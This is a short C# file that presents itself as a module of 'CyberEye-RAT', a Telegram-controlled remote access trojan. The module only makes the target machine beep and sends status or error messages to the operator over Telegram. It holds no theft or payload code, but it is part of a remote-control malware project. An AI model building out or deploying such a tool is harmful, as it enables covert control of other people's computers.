/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/
using System;

namespace TelegramRAT.modded
{
    internal sealed class Beep
    {
        public static void PlayBeep(int frequencyHz, int durationMs)
        {
            try
            {
                if (frequencyHz > 37 && frequencyHz < 32767)
                {
                    Console.Beep(frequencyHz, durationMs);
                }
                else
                {
                    telegram.sendText("❌ Invalid frequency. Frequency must be between 37 and 32767 Hz.");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText($"❌ Error: {ex.Message}");
            }
        }
    }
}
